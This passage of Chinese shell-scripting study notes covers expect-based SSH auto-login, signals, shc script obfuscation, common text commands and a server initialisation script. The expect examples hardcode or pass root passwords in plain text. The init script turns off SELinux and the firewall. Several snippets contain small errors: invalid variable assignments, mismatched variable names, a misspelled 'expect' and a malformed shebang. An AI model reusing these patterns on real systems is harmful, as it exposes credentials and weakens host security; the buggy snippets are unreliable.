![image-20220403205603424](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220403205603424.png)

如上图，在“发送”中输入密码时，这里可以勾选“隐藏”，有一定密码隐私保护。

![image-20220403205847842](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220403205847842.png)

设置好后，在SecureCRT中直接连接看看是否可以实现自动登录的效果，如下动图：

![img](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cv2-8e5f15c9d6b78d4982119e55f60aa150_b.webp)

那通过脚本的方式如何实现以上自动登录的效果？其实一般遇到的自动化处理远比这个简单的登陆要复杂的多，因为这个例子最简单，我们以此为例。

如下图，这里的expect与send与上文中的“预期”、“发送”一个意思，即遇到字符串“login”就输入root加回车，遇到“assword”，再输入密码，最后登陆进去后，遇到提示符#，则在home目录下创建个新文件。

![image-20220403210540180](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220403210540180.png)

如下图，看实际效果：

![img](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cv2-90a5e1ff6fb6f398a7ba054a04aac28c_b.webp)



## 第十章 trap陷阱触发

### 1.信号signal

信号在5.11已经介绍过了

信号是软件中断，是一种异步通信方式，处理异步的事件。例如我们在终端中运行程序，通过按下键盘“Ctrl+c”,可以发出一个SIGINT中断信号去停止程序运行。
信号的处理有3种方法：
\1. 忽略该信号，大多数信号都可以如此处理。但是SIGKILL和SIGSTOP除外，决不能被忽略。
\2. 捕获信号，用户自定义一个信号处理函数，当信号发生时，就会触发调用该自定义信号函数。信号SIGKILL和SIGSTOP不能被捕获。
\3. 系统默认动作， 大多数信号的默认动作是终止该进程。有些信号会“终止+core”，会dump出该进程的内存映像，保存在文件中。

比如当我们操作一个东西产生某种信号时。可以写一个信号脚本去捕捉他并作别的信号操作



这里讲高级版

### 信号处理函数的注册

信号处理函数的注册不只一种方法，分为入门版和高级版

1. 入门版：函数`signal`
2. 高级版：函数`sigaction`

#### 信号处理发送函数

信号发送函数也不止一个，同样分为入门版和高级版
 1.入门版：kill
 2.高级版：sigqueue

一文完全看懂 | Linux 信号处理原理与实现：

https://mp.weixin.qq.com/s?src=11&timestamp=1648996405&ver=3716&signature=L01cKr7PSxBqAq6YT3UDghCl46953aKBqS-u1qfRFygxMod-xqXYGs8iHsT36iZUE9Uj1wf5f2Crf9gqmTaK6eDKUhyKSHqunYtXMJbWtjiNXIpd-moiQw8pNQ*hgoeP&new=1

Linux fd 系列｜信号编程（signal）竟能这样做？涨姿势：

https://mp.weixin.qq.com/s?src=11&timestamp=1648996405&ver=3716&signature=L01cKr7PSxBqAq6YT3UDghCl46953aKBqS-u1qfRFygg67a2MOsnmOc5Q25a238JY-MMmgwtEQ7k3yZxTjuDooY2Ji7b69-t0lRfvOBImit3veK41sw4V7FOfj1wr1sL&new=1

Linux 信号（signal）：

https://www.jianshu.com/p/f445bfeea40a

前面三个都深入内核信号原理,到底都是c语言代码。用法在下面这个链接

[Linux信号signal用法详解及注意事项 ](https://www.cnblogs.com/wudymand/p/9226438.html)



### 2.trap运用

详见5.11

## 第十一章 shell脚本加密与包装

### 1.加密shell脚本

Shc可以用来对shell脚本进行加密，可以将shell脚本转换为一个可执行的二进制文件。经过shc对shell脚本进行加密后，会同时生成两种个新的文件，一个是加密后的可执行的二进制文件（文件名以.x结束），另一个是C语言的原文件（文件名以.x.c结束）。

shc工具来给shell脚本增加一层额外的安全保护. shc是一个脚本编译工具, 使用RC4加密算法,
它能够把shell程序转换成[二进制](https://so.csdn.net/so/search?q=二进制&spm=1001.2101.3001.7020)可执行文件(支持静态链接和动态链接).该工具能够很好的支持: 需要加密, 解密, 或者通过命令参数传递口令的环境.

SHC是指：Shell脚本编译器(Shell Script Compiler)。

![image-20220403230728216](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220403230728216.png)

-e:指定过期时间为2010年10月20日
-m:过期后打印出的信息；
-v: verbose
-r: 可在相同[操作系统](http://lib.csdn.net/base/operatingsystem)的不同主机上执行
-f: 指定源shell

先新建一个sh文件

![image-20220403230801599](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220403230801599.png)

![image-20220403230918314](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220403230918314.png)

![image-20220403231014536](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220403231014536.png)

.sh 是原始的未加密shell脚本

.sh.x 是二进制格式的加密shell脚本

.sh.x.c 是.sh文件的C源代码。编译该C源代码以创建上面的加密的.sh.x文件.

![image-20220403232947906](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220403232947906.png)

现在，让我们执行加密的Shell脚本，确保能够运行：

![image-20220403233022397](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220403233022397.png)

![image-20220403233138219](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220403233138219.png)

可以看到.sh.x文件已经被自动赋权可执行

**指定Shell脚本的过期时间**

使用shc，您还可以指定到期日期。即在这个到期日期之后，当有人尝试执行Shell脚本时，将收到错误消息。使用`shc -e`选项创建一个新的加密Shell脚本，指定到期日期。到期日期以dd/mm/yyyy 格式指定。

![image-20220403233219218](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220403233219218.png)

![image-20220403233237435](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220403233237435.png)

在此示例中，如果有人尝试执行welcome.sh.x脚本文件，会提示已过期。

```text
[root@localhost scripts]# ./welcome.sh.x 
./welcome.sh.x: has expired!
Please contact your provider jahidulhamid@yahoo.com
```

![image-20220403233317778](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220403233317778.png)

```text
[root@localhost scripts]# shc -e 01/02/2021 -m "Please contact admin@example.com!" -v -f welcome.sh 
shc shll=sh
shc [-i]=-c
shc [-x]=exec '%s' "$@"
shc [-l]=
shc opts=
shc: cc   welcome.sh.x.c -o welcome.sh.x
shc: strip welcome.sh.x
shc: chmod ug=rwx,o=rx welcome.sh.x
```

![image-20220403233754453](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220403233754453.png)

### 2.生成二进制可执行文件

第一种方法(gzexe)：
这种加密方式不是非常保险的方法，但是能够满足一般的加密用途，可以隐蔽脚本中的密码等信息。
它是使用系统自带的gzexe程序，它不但加密，同时压缩文件。
使用方法:
gzexe file.sh
它会把原来没有加密的文件备份为 file.sh~ ,同时 file.sh 即被变成加密文件； 它也能生成可执行文件

第二种就是shc 生成的就是*.sh.x.c 这个就是可执行文件

其余看11.1

不过上面生成的时动态的

下面生成静态的

```
我们可以通过下面的方法生成一个静态链接的二进制可执行文件:

# CFLAGS=-static shc -r -f mysql_backup.sh 
# file mysql_backup.sh.x 
mysql_backup.sh.x: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), 
statically linked, for GNU/Linux 2.6.9, stripped

提示: 通过sch加密后的脚本文件很安全吗? 
一般来说是安全的, 不过可以使用gdb和其它的调试工具获得最初的源代码. 如果你需要更加安全的方法, 可以考虑使用wzshSDK.

另外, sch还可以设置脚本的运行期限和自定义返回信息: 
shc -e 03/31/2007 -m “the mysql backup script is now out of date.” -f mysql_back.sh

-e表示脚本将在2007年3月31日前失效, 并根据-m定义的信息返回给终端用户.

```

二进制文件的刨析

http://www.linuxjournal.com/article/8256

## 第十二章 shell中常用命令介绍

### 1.grep命令详解

看1.6

### 2.find与xargs

find：https://www.baidu.com/link?url=sTS918xaJYE1vGT_YNBPrDcpLodKezeIuQbInaiQWZcZT8W7MhfiADFxgP7FVMufd-qS3cCg-teOUbixKCL3C_&wd=&eqid=8f2c8fce000b0e88000000056249c3a1

xargs：看5.16

### 3.sort和uniq命令详解

sort:http://c.biancheng.net/view/996.html

sort 是 Linux 的排序命令，而且可以依据不同的数据类型来进行排序。sort 将文件的每一行作为一个单位，相互比较。比较原则是从首字符向后，依次按 ASCII 码值进行比较，最后将它们按升序输出。

uniq:https://www.runoob.com/linux/linux-comm-uniq.html

Linux uniq 命令用于检查及删除文本文件中重复出现的行列，一般与 sort 命令结合使用。

uniq 可检查文本文件中重复出现的行列。

### 4.cut命令详解

https://www.baidu.com/link?url=TkXu8LEBFQtFuiMbt8jdRzY8ugC26gEaiE37jXoU2fVqV0EINQSlhJ7FvApPzZprmAvxiS3lgz0FnECrOZODSJlmg81D0ESJxtRWPrnlHyW&wd=&eqid=a5a32855001ecfff000000056249c45e

### 5.curl与wget命令详解

### 6.cat、tac与rev

tac与rev:http://www.mamicode.com/info-detail-2543198.html

tac和rev命令列到一起，并不是功能相似，而是他们都是将输入内容反置。

### 7.tr命令详解

tr，您可以非常容易地实现 sed 的许多最基本功能。您可以将 tr 看作为 sed

https://blog.csdn.net/weixin_31414801/article/details/116578294

### 8.paste命令详解

paste 指令会把每个文件以列对列的方式，一列列地加以合并。

https://www.baidu.com/link?url=xuvZZ5GFNiMjKmbUUXxW9UEpaQ7zNBy1_voXXLzCijAL9NYJ9Nije8UJVZJQ43VWjQwjrednpJql9-XSRVKtvq&wd=&eqid=a000fec5000abeb3000000056249c62c

### 9.join命令详解

Linux join命令用于将两个文件中，指定栏位内容相同的行连接起来。

找出两个文件中，指定栏位内容相同的行，并加以合并，再输出到标准输出设备。

![image-20220404000912649](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404000912649.png)

![image-20220404000927226](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404000927226.png)

## 第十三章 一些shell技巧

### 8.连接mysql数据库操作

**1. 连接mysql 数据库**

shell中连接数据库的方法很简单，只需要指定用户名，密码，连接的数据库名称，然后通过重定向，输入mysql的语句，如下所示：

![image-20220404001102673](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404001102673.png)

但这并不是一个好办法，任何使用该脚本的用户都能看到该数据库用户的账号和密码，要解决这个问题，可以用mysql 数据库的一个特殊配置文件。mysql 数据库使用$HOME/.my.cnf 文件来读取特殊的启动命令和设置。其中一项设置是由该用户账户发起的mysql 会话的默认密码。要在这个文件中设置默认密码，可以加入下面的内容：

![image-20220404001125354](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404001125354.png)

## 第十四章 shell十六问

### 1.PS和CR的关系

`CR`: 由`Enter`产生

IFS`是用来拆解`command line`中每一个词 (word) 用的， 因为`shell command line`是按词来处理的。 而`CR`则是用来结束`command line`用的，这也是为何我们敲`Enter`键， 命令就会跑的原因。

### 2.echo知多少

https://wiki.jikexueyuan.com/project/13-questions-of-shell/echo.html

![image-20220404143222932](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404143222932.png)

![image-20220404143232024](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404143232024.png)

### 3.“”(双绰号)与”(单引号)差在哪儿

http://wiki.jikexueyuan.com/project/13-questions-of-shell/double-single.html

' '差不多就是实例化的意思

“ ”差不多是要使里面的字符先产生作用

![image-20220404144143171](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404144143171.png)

### 4.export前后差在哪儿

http://wiki.jikexueyuan.com/project/13-questions-of-shell/var-value.html

严格来说，我们在当前shell中所定义的变量，均属于 "本地变量"(local variable), 只有经过`export`命令的 "输出"处理，才能成为"环境变量"(environment variable)：

![image-20220404144455963](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404144455963.png)

经过`export`输出处理之后，变量A就能成为一个环境变量 供其后的命令使用。在使用`export`的时候，请别忘记 shell在命令行对变量的"替换"(substitution)处理。

比方说：

![image-20220404144547037](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404144547037.png)

上面的命令并未将A输出为"环境变量"，而是将B导出 这是因为在这个命令行中，$A会首先被替换为B,然后在"塞回" 作`export`的参数。

取消变量(unset)

要取消一个变量，在bash中可使用`unset`命令来处理

![image-20220404144635188](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404144635188.png)

事实上，所取消的是变量 B 而不是 A。

此外，变量一旦经过 unset 取消之后， 其结果是将整个变量拿掉，而不是取消变量的值。

如下两行其实是很不一样的：

![image-20220404144702216](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404144702216.png)

第一行只是将变量 A 设定为"空值"(null value), 但第二行则是让变量 A 不存在。 虽然用眼睛来看， 这两种变量的状态在如下的命令结果中都是一样的：

![image-20220404144716657](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404144716657.png)

![image-20220404144926179](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404144926179.png)



### 5.exec跟source/fork差在哪儿

http://wiki.jikexueyuan.com/project/13-questions-of-shell/exec-source.html

利用source执行脚本可不执行fork。从而将所有的脚本指令，在父shell执行。而不再依次-新建子shell-完成后返回父shell。

这个是source和fork的不同

```
source执行脚本的方式
source ./*.sh
../*.sh
```

那exec和source/fork又有什么不同呢？

`exec` 也是让 script 在同一个进程上执行，但是原有进程则被结束了。 简言之，原有进程能否终止，就是`exec`与`source/fork`的最大差异了。

下面让我们为两个简单的 script，分别命名为 1.sh 以及 2.sh

![image-20220404150444565](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404150444565.png)

![image-20220404150510917](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404150510917.png)

然后分别跑如下参数来观察结果：

![image-20220404150809060](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404150809060.png)

fork和source对比可以看到这个c是在2.sh内的

但是source是在父shell运行，所以会调用在外面

![image-20220404150945504](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404150945504.png)

可以看到exec相比source运行的话直接少了两端。

因为exec在运行2.sh后直接连着1.sh直接退出去了

不会运行1.sh中剩下的内容

### 6.()与{}差在哪儿

http://wiki.jikexueyuan.com/project/13-questions-of-shell/brackets-and-braces.html

`()` 将`command group`置于`sub-shell(子shell)` 中去执行，也称 `nested sub-shell`。

`{}` 则是在同一个`shell`内完成，也称`non-named command group`。

要是在 `command group`中扯上变量及其他环境的修改， 我们可以根据不同的需求来使用`()`或`{}`。 通常而言, 若所作的修改是临时的，且不想影响原有或以后的设定， 那我们就使用`nested sub-shell`, 即`()`; 反之，则用`non-named command group`, 即`{}`。

### 7.$(())和$()、${}差在哪儿

http://wiki.jikexueyuan.com/project/13-questions-of-shell/eight.html

在bash shell中, `$()`与``(反引号)都是用来做`命令替换`(command substitution)的。

所谓的`命令替换`与我们学过的变量替换差不多，都是用来`重组命令行`：完成 `` 或者`$()`里面的 命令，将其结果替换出来，再重组命令行。

再让我们看看${}吧...它其实就是用来做 变量替换用的啦。 一般情况下，$var与${var}并没有啥不一样。 但是用${}会比较精准的界定变量名称的范围， 比方说:

![image-20220404152701265](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404152701265.png)

不过，假如你只看到`${}`只能用来界定变量名称的话， 那你就实在太小看bash了。

为了完整起见，我这里再用一些例子加以说明`${}`的一些 特异功能： 假设我们定义了一个变量file为：

![image-20220404152841184](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404152841184.png)

![image-20220404152906540](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404152906540.png)

![image-20220404152915050](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404152915050.png)

![image-20220404153215009](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404153215009.png)

![image-20220404153235921](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404153235921.png)

![image-20220404153402938](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404153402938.png)

![image-20220404153440199](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404153440199.png)

$(())作用

**`$(())`是用来作整数运算的**。

在bash中， `$(())`的整数运算符号大致有这些：

- +- * / #分别为"加、减、乘、除"。
- % #余数运算,(模数运算)
- & | ^ ! #分别为"AND、OR、XOR、NOT"运算。

例如：

![image-20220404153638008](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404153638008.png)



### 8.$@和$*差在哪儿

精确来讲，两者只有在 soft quote 中才有差异，否则，都表示"全部参数"( $0 除外)。

举例来说好了：

若在 command line 上跑 my.sh p1 "p2 p3" p4 的话，

不管是 $@ 还是 $* ，都可得到 p1 p2 p3 p4 就是了。

但是，如果置于 soft quote 中的话：

"$@" 则可得到 "p1" "p2 p3" "p4" 这三个不同的词段(word)﹔

"$*" 则可得到 "p1 p2 p3 p4" 这一整串单一的词段。

什么是soft quote呢？

“” 就是soft quote

’‘是hard quote

下面两个脚本来看看

![image-20220404162641163](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404162641163.png)

![image-20220404162656952](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404162656952.png)

如果是是soft quote呢？

![image-20220404162809212](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404162809212.png)

![image-20220404162752690](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404162752690.png)

### 9.&&和||差在哪儿

http://wiki.jikexueyuan.com/project/13-questions-of-shell/ten.html

`&&` 与 `||` 都是用来 "组建" 多个 command line 用的；

command1 && command2` # command2 只有在 command1 的 RV 为 0(true) 的条件下执行。

command1 || command2` # command2 只有在 command1 的 RV 为非 0(false) 的条件下执行。

![image-20220404154335023](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404154335023.png)

### 10.你要if还是case

http://wiki.jikexueyuan.com/project/13-questions-of-shell/if-case.html

### 11.for what?while和until差在哪儿？

http://wiki.jikexueyuan.com/project/13-questions-of-shell/for-while-until.html

### 12.[^]和[!] 差在哪儿

https://wiki.jikexueyuan.com/project/13-questions-of-shell/wildcard.html

进阶:https://wiki.jikexueyuan.com/project/13-questions-of-shell/regular-expression.html

### 13.command

command命令调用指定的指令并执行，命令执行时不查询shell函数。command命令只能够执行shell内部的命令。

![image-20220407130645858](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220407130645858.png)

### 14.stty

修改终端命令行的相关设置

#### 语法

```
stty(选项)(参数)
```

#### 选项

```bash
-a：以容易阅读的方式打印当前的所有配置；
-g：以stty可读方式打印当前的所有配置。
-F, --file=设备       打开并使用指定设备代替标准输入
      --help            显示此帮助信息并退出
      --version         显示版本信息并退出
```

#### 参数

终端设置：指定终端命令行的设置选项。

#### 实例

**在命令行下，禁止输出大写的方法：**

```
stty iuclc     #开启
stty -iuclc    #恢复
```

**在命令行下禁止输出小写：**

```
stty olcuc    #开启
stty -olcuc   #恢复
```

**打印出终端的行数和列数：**

```
stty size
```

**改变Ctrl+D的方法:**

```
stty eof "string"
```

系统默认是Ctrl+D来表示文件的结束，而通过这种方法，可以改变！

**屏蔽显示：**

```
stty -echo   #禁止回显
stty echo    #打开回显
```

测试方法:

```
stty -echo;read;stty echo;read
```

**忽略回车符：**

```
stty igncr     #开启
stty -igncr    #恢复
```

**定时输入：**

```bash
timeout_read()
{
    timeout=$1
    old_stty_settings=`stty -g`　　#save current settings
    stty -icanon min 0 time 100　　#set 10seconds,not 100seconds
    eval read varname　　          #=read $varname
    stty "$old_stty_settings"　　  #recover settings
}
```



更简单的方法就是利用read命令的`-t`选项

```
read -t 10 varname
```

### 15.expect

#### expect 命令介绍：

expect 工具是一个根据脚本与其他交互式程序进行交互。通过在脚本中设定期望值和响应值进行交互操作。主要应用于执行命令和程序时，系统以交互形式要求输入指定字符串，实现交互通信。

解释型语言提供分支和高级控制结构引导对话。此外，用户可以在需要时直接进行控制和交互，然后将控制权返回给脚本。

简单来说，expect工具可以控制、处理输入，输出流，然后提供自动填写数据等需要用户交互式输入的数据的地方实现自动化处理。Expect就是为了处理“自动交互”的工具。


#### expect 工作原理：

`spawn`启动指定进程—`expect`获取指定关键字—`send`向指定程序发送指定字符—执行完成退出.

#### expect 应用场景：

- 运行 fsck，并根据预定标准回答其问题，回答“是”、“否”或将控制权交还给您。
- 远程连接设备并执行自动化操作
- 主要是一些需要人机交互的地方，如果提前知道应该输入什么指令都可以使用expect 工具

#### 基本语法:

```bash
[root@localhost ~]# vim test.exp				=>	一般将expect脚本的后缀命名为".exp"


#!/usr/bin/expect			=>	expect的解析器，与shell中的#!/bin/bash类似
set timeout n				=>	设置超时时间n秒，表示下面的代码需在n秒钟内完成，如果超过，则退出。用来防止ssh远程主机网络不可达时卡住及在远程主机执行命令宕住
set name "12345"			=>	set设置变量，name的值为123456


spawn command1 command2..				=>	执行命令，也可以将变量作为命令输入
expect{									=>	接受执行命令返回的信息

"accept1" {send "instruction1\r"; exp_continue}						=>	匹配到accest1，发送instruction1 指令并且\r 回车执行

"accept2" {send "instruction2\r"; exp_continue}			=>	匹配到accest2，发送instruction2 指令并且\r 回车执行，exp_continue表示循环匹配

"accept3" {send "\r"; exp_continue}									=>	匹配到accept3表示直接回车执行

"accept4" {send "$name\r"}								=>	匹配到accept4,将变量值作为指令，并且回车执行
}


```



**注意如果需要匹配的全部是多项，需要在最后再增加一项`"Cleaning up" { send "\r"}`**

![在这里插入图片描述](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204131309198.png)

#### expect 启用选项：

```
-c	执行脚本前先执行的命令，可多次使用
-d	debug模式，可以在运行时输出一些诊断信息，与在脚本开始处使用exp_internal 1相似。
-D	启用交换调式器,可设一整数参数。
-f	从文件读取命令，仅用于使用#!时。如果文件名为"-"，则从stdin读取(使用"./-"从文件名为-的文件读取)。
-i	交互式输入命令，使用"exit"或"EOF"退出输入状态
--	标示选项结束(如果你需要传递与expect选项相似的参数给脚本时)，可放到#!行:#!/usr/bin/expect --
-v	显示expect版本信息
```



#### expect 命令参数：

```
spawn	交互程序开始，执行后面的命令或程序。需要进入到expect环境才可以执行，不能直接在shell环境下直接执行
set timeout n	设置超时时间，表示该脚本代码需在n秒钟内完成，如果超过，则退出。用来防止ssh远程主机网络不可达时卡住及在远程主机执行命令宕住。如果设置为-1表示不会超时
set	定义变量
$argv	expect脚本可以接受bash的外部传参，可以使用[ lindex $argv n ]n为0表示第一个传参，为1表示第二个传参，以此类推
expect	从交互程序进程中指定接收信息, 如果匹配成功, 就执行send的指令交互；否则等待timeout秒后自动退出expect语句
send	如果匹配到expect接受到的信息，就将send中的指令交互传递，执行交互动作。结尾处加上\r表示如果出现异常等待的状态可以进行核查
exp_continue	表示循环式匹配，通常匹配之后都会退出语句，但如果有exp_continue则可以不断循环匹配，输入多条命令，简化写法。
exit	退出expect脚本
expect eof	spawn进程结束后会向expect发送eof，接收到eof代表该进程结束
interact	执行完代码后保持交互状态，将控制权交给用户。没有该命令执行完后自动退出而不是留在远程终端上
puts	输出变量
```

#### 基本语法:

##### 单一分支模式：

```bash
#!/usr/bin/expect
set timeout 30
spawn command			=>	启动一个进程，执行command命令
expect "Match message" {send "instruction1\r"}		=>	命令执行后返回交互信息，send键入交互指令
或
expect "Match message"
send "instruction1\r"
expect eof			=>	执行完后结束该进程
```

##### 多分支模式：

```bash
#!/usr/bin/expect
set timeout 30
spawn command
exect {
"Match message1" { send "instruction1\r";exp_continue}		=>	exp_continu表示可以多次匹配
"Match message2" { send "instruction2\r";exp_continue }
"Match message3" { send "\r"}		=>	代表直接回车选择默认选项
...
}
interact			=>	不退出，保持交互状态
```

#### expect 使用

##### 自动登录ssh执行命令

```bash
# vim test.exp


#!/usr/bin/expect
set host [ lindex $argv 0 ]
set ip [ lindex $argv 1 ]
set passwd [ lindex $argv 2 ]
set cmd [ lindex $argv 3 ]

#1、argc，命令行传递参数的总个数。
#2、argv，命令行传递的每个参数值。

if {$argc < 4} {
    puts "Usage:cmd <hostname> <ipaddress> <password> <cmd>"
    exit 1
}
set timeout 20

spawn ssh -l $host $ip  $cmd
expect "password"
send "$passwd\r"
expect eof			=>	注意：就算 这里是interact也不会以保持交互状态



执行：
	# chmod +x test.exp
	# ./test.exp 10.1.1.20 root toor /root/a.sh
或
	# expect test.exp 10.1.1.20 root toor /root/a.sh

```

##### 在shell 中嵌套expect

==注意：前面有==`-EOF`

###### 使用EOF的嵌套调用:

```bash
#!/bin/bash
$ip=10.1.1.15
$user=root
$pass=toor

/usr/bin/expect <<-EOF

set timeout 20

spawn ssh $user@$IP
expect {
 "yes/no" { send "yes\r"; exp_continue }
 "password"  { send "$pass\r" }
}

expect "]#"
send "touch file{1..10}"
expect eof
EOF

```

==或者使用==EOF

```shell
expect <<EOF
spawn ssh $user@$IP
```

###### ==或者也可以==两个expect加expect -c嵌套

```shell
 expect -c "
      spawn ssh -p $PORT $USER@$IP
      expect {
        \"(yes/no)\" {send \"yes\r\"; 					exp_continue}
        \"password:\" {send \"$PASS\r\"; 				exp_continue}
        \"$USER@*\" {send \"$COMMAND\r exit\r\"; 		 exp_continue}
    }
    "
```

### 16.seq

seq 100 能快速自动生成100个整数（1~100）

可这样用它

```shell
for i in 'seq 100'
```



## 第十五章 综合实战讲解一

### 1.nagios监控插件脚本

在自已编写监控插件之前我们首先需要对nagios监控原理有一定的了解

Nagios的功能是监控服务和主机，但是他自身并不包括这部分功能，所有的监控、检测功能都是通过各种插件来完成的。

启动Nagios后，它会周期性的自动调用插件去检测服务器状态，同时Nagios会维持一个队列，

所有插件返回来的状态信息都进入队列， Nagios每次都从队首开始读取信息，并进行处理后，把状态结果通过web显示出来。

Nagios提供了许多插件，利用这些插件可以方便的监控很多服务状态。安装完成后，在nagios主目录下的/libexec里放有nagios自带的可以使用的所有插件，

如，check_disk是检查磁盘空间的插件，check_load是检查CPU负载的，等等。基本上每一个插件可以通过运行./check_xxx –h 来查看其使用方法和功能。

![image-20220404214905373](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404214905373.png)

当我们知道了nagios是通过命令返回值来判断状态，在[shell](http://www.ahlinux.com/shell/)中也即是通过命令的退出状态码来判断，这样我们可以自已编写一个监控脚本

如编写 监控[postgresql](http://www.ahlinux.com/postgresql/)[数据库](http://www.ahlinux.com/db/)的ESTABLISHED连接数 ，可以如下的[命令](http://www.ahlinux.com/start/cmd/)及语法进行编写。

![image-20220404214948165](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404214948165.png)

在此作为一种编写nagios监控插件的思路，其中在if语句中的3条echo语句中、我们可以发现输出的内容是由 | 分隔

其中只写入"|"之前的内容也行，"|"之后的的内容为可选见容， nagios会将"|"之后的内容作为性能数据输出 。如可输出给pnp4nagios，性能数据格式如下：

```
'label'=value[UOM];[warn];[crit];[min];[max]
```

![image-20220404215023851](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220404215023851.png)

## 第十六章 综合实战讲解二

### 1.系统初始化脚本

需求:

1. 安装系统新能分析工具已经其他的工具

2. 设置时区并同步时间

3. 禁用selinux

4. 清空防火墙默认策源

5. 历史命令显示操作时间

6. 禁止root远程登录

7. 禁止定时任务发送邮件

8. 设置最大打开文件数

9. 减少Swap使用

10. 系统内核参数的优化

    ```bash
    #/bin/bash
    # 安装系统性能分析工具及其他
    yum install gcc make autoconf vim sysstat net-tools iostat iftop iotp wget lrzsz lsof unzip openssh-clients net-tool vim ntpdate -y
    # 设置时区并同步时间
    ln -s /usr/share/zoneinfo/Asia/Shanghai /etc/localtime
    if ! crontab -l |grep ntpdate &>/dev/null ; then
        (echo "* 1 * * * ntpdate time.windows.com >/dev/null 2>&1";crontab -l) |crontab 
    fi
     
    # 禁用selinux
    sed -i '/SELINUX/{s/permissive/disabled/}' /etc/selinux/config
     
    # 关闭防火墙
    if egrep "7.[0-9]" /etc/redhat-release &>/dev/null; then
        systemctl stop firewalld
        systemctl disable firewalld
    elif egrep "6.[0-9]" /etc/redhat-release &>/dev/null; then
        service iptables stop
        chkconfig iptables off
    fi
     
    # 历史命令显示操作时间
    if ! grep HISTTIMEFORMAT /etc/bashrc; then
        echo 'export HISTTIMEFORMAT="%Y-%m-%d %H:%M:%S  `whoami` "' >> /etc/bashrc
    fi
     
    # SSH超时时间
    if ! grep "TMOUT=600" /etc/profile &>/dev/null; then
        echo "export TMOUT=600" >> /etc/profile
    fi
     
    # 禁止root远程登录 切记给系统添加普通用户，给su到root的权限
    sed -i 's/#PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
     
    # 禁止定时任务向发送邮件
    sed -i 's/^MAILTO=root/MAILTO=""/' /etc/crontab 
     
    # 设置最大打开文件数
    if ! grep "* soft nofile 65535" /etc/security/limits.conf &>/dev/null; then
    cat >> /etc/security/limits.conf << EOF
        * soft nofile 65535
        * hard nofile 65535
    EOF
    fi
     
    # 系统内核优化
    cat >> /etc/sysctl.conf << EOF
    net.ipv4.tcp_syncookies = 1
    net.ipv4.tcp_max_tw_buckets = 20480
    net.ipv4.tcp_max_syn_backlog = 20480
    net.core.netdev_max_backlog = 262144
    net.ipv4.tcp_fin_timeout = 20  
    EOF
     
    # 减少SWAP使用
    echo "0" > /proc/sys/vm/swappiness
    ```

### 2.基础软件安装脚本

### 3.iptables脚本

